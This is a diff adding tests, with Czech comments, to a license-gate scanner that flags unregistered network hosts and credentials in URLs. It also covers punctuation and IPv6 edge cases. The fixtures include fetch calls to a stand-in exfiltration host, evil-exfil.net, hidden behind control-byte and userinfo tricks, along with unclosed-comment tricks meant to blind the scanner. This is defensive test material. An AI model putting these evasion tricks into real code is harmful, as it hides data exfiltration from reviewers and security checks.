@@ -759,6 +759,174 @@ describe('license-gate: pokrytí (kontroly 3 a 5)', () => {
     expect(out).toContain('jen-v-mts.io');
     expect(code).toBe(1);
   });
+
+  /**
+   * Konec literálu se dřív značil bajtem `U+0002` **uvnitř** skenovaného textu, a
+   * značku uvnitř dat si skenovaný soubor umí napsat sám. WHATWG ten bajt zakóduje
+   * do userinfo, takže `fetch` šel na host za posledním `@`, zatímco brána hlásila
+   * ten před ním — registrovaný, tedy zeleně. Hranice je od té doby offset mimo
+   * text, takže tady není co podstrčit.
+   *
+   * Escapy se skládají za běhu ze zpětného lomítka: napsané přímo je editory na
+   * tomhle stroji opakovaně převedly na skutečný řídicí bajt, čímž by se z pěti
+   * různých zápisů staly dva stejné a tabulka by tiše měřila míň, než tvrdí.
+   */
+  const BACKSLASH = String.fromCharCode(92);
+  it.each([
+    ['unicode escapem', `${BACKSLASH}u0002`],
+    ['hex escapem', `${BACKSLASH}x02`],
+    ['zápisem kódového bodu', `${BACKSLASH}u{2}`],
+    ['oktalovým escapem', `${BACKSLASH}2`],
+    ['syrovým bajtem', String.fromCharCode(2)],
+  ])('konec literálu podstrčený %s skutečný cíl neskryje', (_zapis, marker) => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/mark.ts', `await fetch('https://api.fixture-provider.io${marker}@evil-exfil.net/v1');\n`);
+
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('evil-exfil.net');
+    expect(code).toBe(1);
+  });
+
+  it('týž tvar s heslem ohlásí i kontrolu údajů, a heslo nevypíše', () => {
+    const dir = makeGreenRepo();
+    // Dřív neohlásila **ani jedna** kontrola: hosty viděly registrovaný host,
+    // kontrola údajů se zastavila před `@`, takže žádné userinfo neviděla.
+    write(dir, 'src/cred.ts', `const u = 'https://api.fixture-provider.io${BACKSLASH}u0002:hunter2@evil-exfil.net/v1';\n`);
+
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('URL nese userinfo');
+    expect(out).not.toContain('hunter2');
+    expect(code).toBe(1);
+  });
+
+  /**
+   * Neuzavřený `/*` v kódové pozici zahazoval **zbytek souboru** — a do kódové
+   * pozice stačí dostat se jedním rozejitým stavem uvozovek. Brána pak nad
+   * voláním, které v souboru stojí, hlásila 7/7 PASS: mlčení, ne nález.
+   */
+  it.each([
+    ['regulárním výrazem po konci bloku', `function f() { return 1; }\nconst q = /['"]/.test(s);\n`],
+    ['apostrofem v JSX textu', `export const Hero = () => <p>Let's go</p>;\n`],
+  ])('neuzavřený blokový komentář po rozejití stavu %s neoslepí zbytek souboru', (_jak, prefix) => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/blind.ts', `${prefix}const c = '/*';\nawait fetch('https://evil-exfil.net/v1');\n`);
+
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('evil-exfil.net');
+    expect(code).toBe(1);
+  });
+
+  /**
+   * Oba případy výš mají rozejití a `/*` na různých řádcích, takže je zachrání
+   * **kterákoli** z těch dvou pojistek — a ani jedna z nich tím není doložená.
+   * Naměřeno: mutant, který ochranu neuzavřeného `/*` zase vypnul, nechal celou
+   * sadu zelenou. Tenhle případ má obojí na jednom řádku, takže reset na konci
+   * řádku nemá co zachránit a zbývá jen ta správná pojistka.
+   */
+  it('neuzavřený blokový komentář na TÉMŽ řádku jako rozejití taky neoslepí', () => {
+    const dir = makeGreenRepo();
+    write(
+      dir,
+      'src/blind-oneline.ts',
+      "export const t = 'Let's go'; const c = '/*'; await fetch('https://evil-exfil.net/v1');\n",
+    );
+
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('evil-exfil.net');
+    expect(code).toBe(1);
+  });
+
+  /**
+   * A obráceně: tady je nosný **jen** reset na konci řádku, žádné `/*` v souboru
+   * není. Bez resetu se řetězec otevřený rozejitím táhne přes konec řádku, takže
+   * konec literálu u adresy padne jinam a registrovaný host se ohlásí pod
+   * zmrzačeným jménem — tedy falešný nález, a ten se obchází přes `--no-verify`.
+   */
+  it('rozejitý stav uvozovek nezmrzačí jméno hostu o řádek níž', () => {
+    const dir = makeGreenRepo();
+    write(
+      dir,
+      'src/desync.ts',
+      "export const msg = 'Let's go';\nconst u = 'https://api.fixture-provider.io';\n",
+    );
+
+    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
+  });
+
+  /**
+   * Registrovaný host s interpunkcí věty za sebou hlásila brána jako jiný,
+   * nezaregistrovaný host (`api.fixture-provider.io.`). **Falešný nález je tu
+   * stejně vážný jako díra:** obchází se přes `--no-verify`, čímž se vypne i
+   * clean-room brána vedle.
+   */
+  it.each(['.', '!', '?', ',', ';', ':', ')', '}', "'"])(
+    'registrovaný host s %j za sebou není nález',
+    (interpunkce) => {
+      const dir = makeGreenRepo();
+      write(dir, 'src/punct.ts', `export const hint = "viz https://api.fixture-provider.io${interpunkce}";\n`);
+
+      expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
+    },
+  );
+
+  it('JSON zapsaný v jednoduchých uvozovkách taky nález nedělá', () => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/json.ts', `const j = '{"src":"https://api.fixture-provider.io"}';\n`);
+
+    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
+  });
+
+  it('interpunkce za podstrčeným cílem ten cíl neschová', () => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/at.ts', `export const t = 'viz https://api.fixture-provider.io@evil-exfil.net/v1.';\n`);
+
+    const { out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('evil-exfil.net');
+  });
+
+  /**
+   * Tohle je jediný případ, kde je výjimka z ořezu pro autoritu s `@` skutečně
+   * nosná. `]` je součást hostu, ne interpunkce věty — a výjimka pro IPv6 se sem
+   * nechytí, protože autorita začíná uživatelským jménem, ne závorkou. Bez té
+   * výjimky se autorita ořezem stane neparsovatelnou, takže **údaj zmizí úplně**:
+   * kontrola údajů nerozparsovanou URL přeskakuje.
+   */
+  it('userinfo před IPv6 hostem bez cesty se ořezem neztratí', () => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/v6cred.ts', "await fetch('https://user@[2606:4700::1111]');\n");
+
+    const { out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('URL nese userinfo');
+    expect(out).not.toContain('nedá se rozparsovat');
+  });
+
+  it('neregistrovaný host s tečkou se hlásí pod svým čistým jménem', () => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/dot.ts', `await fetch('https://neregistrovany.io.');\n`);
+
+    const { out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('neregistrovany.io');
+    expect(out).not.toContain('neregistrovany.io.');
+  });
+
+  it('IPv6 host bez cesty ořez nerozbije', () => {
+    const dir = makeGreenRepo();
+    // `]` je součást autority, ne interpunkce věty. Ořez by z `[2606:4700::1111]`
+    // udělal neparsovatelné `[2606:4700::1111`, tedy nález z jiného důvodu.
+    write(dir, 'src/v6.ts', "await fetch('https://[2606:4700::1111]');\n");
+
+    const { out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('2606:4700::1111');
+    expect(out).not.toContain('nedá se rozparsovat');
+  });
 });
 
 describe('license-gate: DISCLOSURE.md je výpis, ne text (kontrola 6)', () => {
